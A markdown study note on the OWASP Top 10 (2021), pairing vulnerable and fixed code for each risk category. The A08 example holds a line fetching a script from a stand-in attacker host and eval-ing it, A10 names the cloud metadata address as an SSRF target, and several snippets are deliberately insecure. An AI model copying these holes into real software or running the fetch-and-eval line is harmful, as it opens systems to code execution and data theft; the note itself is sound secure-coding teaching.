---
id: a1b2c3d4-1134-4000-8000-000000000134
title: OWASP Top 10
language: markdown
tags: ''
selection: null
isPinned: false
timestamp: 1781500001134
---

**Links**: [[Web Security]] | [[API Security]] | [[Secure Coding Practices]] | [[Threat Modeling]] | [[Cryptography Basics]] | [[OAuth and Authentication Protocols]]


# OWASP Top 10

The OWASP Top 10 is a standard awareness document representing the most critical security risks to web applications.

## 2021 Rankings

| Rank | Category | Risk Score |
|------|----------|------------|
| A01 | Broken Access Control | High |
| A02 | Cryptographic Failures | High |
| A03 | Injection | High |
| A04 | Insecure Design | Medium |
| A05 | Security Misconfiguration | Medium |
| A06 | Vulnerable and Outdated Components | Medium |
| A07 | Identification and Authentication Failures | High |
| A08 | Software and Data Integrity Failures | Medium |
| A09 | Security Logging and Monitoring Failures | Medium |
| A10 | Server-Side Request Forgery (SSRF) | Medium |

## A01 — Broken Access Control

```javascript
// VULNERABLE: No access check
app.get("/api/users/:id", (req, res) => {
    const user = db.users.findById(req.params.id);
    res.json(user);
});

// FIX: Verify ownership
app.get("/api/users/:id", authenticate, (req, res) => {
    if (req.user.role !== "admin" && req.user.id !== req.params.id) {
        return res.status(403).json({ error: "Forbidden" });
    }
    const user = db.users.findById(req.params.id);
    res.json(user);
});
```

## A02 — Cryptographic Failures

```javascript
// VULNERABLE: No encryption, weak hashing
const password = "password123";                      // Stored in plaintext
const hash = md5(password);                          // MD5 is broken

// FIX: Strong hashing + HTTPS
const bcrypt = require("bcrypt");
const hash = await bcrypt.hash(password, 12);        // bcrypt with work factor 12
```

## A03 — Injection

```javascript
// VULNERABLE: SQL Injection
const query = `SELECT * FROM users WHERE email = '${email}'`;

// FIX: Parameterized queries
const query = "SELECT * FROM users WHERE email = $1";
db.query(query, [email]);

// VULNERABLE: NoSQL Injection
db.users.find({ email: req.body.email });           // $ne bypass

// FIX: Sanitize and validate
db.users.find({ email: String(req.body.email) });
```

## A04 — Insecure Design

Prevention:
- Threat modeling during design phase
- Establish secure design patterns
- Limit resource consumption (rate limiting, request size)
- Principle of least privilege

## A05 — Security Misconfiguration

```yaml
# VULNERABLE: Default credentials, verbose errors, directory listing
spring:
    jpa:
        show-sql: true           # Leaks database schema

# FIX: Hardening
spring:
    jpa:
        show-sql: false
server:
    error:
        include-stacktrace: never
```

## A06 — Vulnerable and Outdated Components

```bash
# Check for vulnerabilities
npm audit
snyk test
dependabot configure

# In CI/CD
steps:
    - run: npm audit --audit-level=high
```

## A07 — Identification and Authentication Failures

```javascript
// VULNERABLE: Weak password policy, no rate limiting
app.post("/login", async (req, res) => {
    const user = await db.users.findByEmail(req.body.email);
    if (user.password === req.body.password) {      // Plaintext comparison
        req.session.userId = user.id;
    }
});

// FIX: Strong authentication
app.post("/login", rateLimit({ windowMs: 15 * 60 * 1000, max: 5 }), async (req, res) => {
    const user = await db.users.findByEmail(req.body.email);
    if (!user || !(await bcrypt.compare(req.body.password, user.passwordHash))) {
        return res.status(401).json({ error: "Invalid credentials" });
    }
    req.session.userId = user.id;
});
```

## A08 — Software and Data Integrity Failures

```javascript
// VULNERABLE: Unsigned update
fetch("https://evil.com/update.sh").then(r => r.text()).then(eval);

// FIX: Signed updates with integrity check
const crypto = require("crypto");
const expectedHash = "abc123...";
const actualHash = crypto.createHash("sha256").update(updateContent).digest("hex");
if (actualHash !== expectedHash) throw new Error("Integrity check failed");
```

## A09 — Security Logging and Monitoring

```javascript
// VULNERABLE: No logging, no alerts
app.use((err, req, res, next) => {
    res.status(500).json({ error: "Internal error" });  // Silent failure
});

// FIX: Structured logging + alerts
app.use((err, req, res, next) => {
    logger.error({ err, userId: req.user?.id, path: req.path });
    alertSystem.trigger("HIGH", "Server error", { userId: req.user?.id });
    res.status(500).json({ error: "Internal error" });
});
```

## A10 — Server-Side Request Forgery (SSRF)

```javascript
// VULNERABLE: Blindly fetches user-supplied URL
app.post("/fetch", async (req, res) => {
    const response = await fetch(req.body.url);            // http://169.254.169.254/ (metadata)
    res.send(await response.text());
});

// FIX: Allowlist + URL validation
const ALLOWED_HOSTS = ["api.example.com", "data.example.com"];

app.post("/fetch", async (req, res) => {
    const url = new URL(req.body.url);
    if (!ALLOWED_HOSTS.includes(url.hostname)) return res.status(403).end();
    const response = await fetch(url);
    res.send(await response.text());
});
```

**Links**: [[Web Security]] | [[API Security]] | [[Secure Coding Practices]] | [[OAuth and Authentication Protocols]] | [[Threat Modeling]] | [[TLS 1.3 Deep Dive]] | [[JSON Web Tokens]] | [[Logging Best Practices]]

**See also**: [[CI CD Pipelines]] (dependency scanning), [[Vault and Secret Management]], [[Monitoring and Observability]] (A09), [[Database Security]]
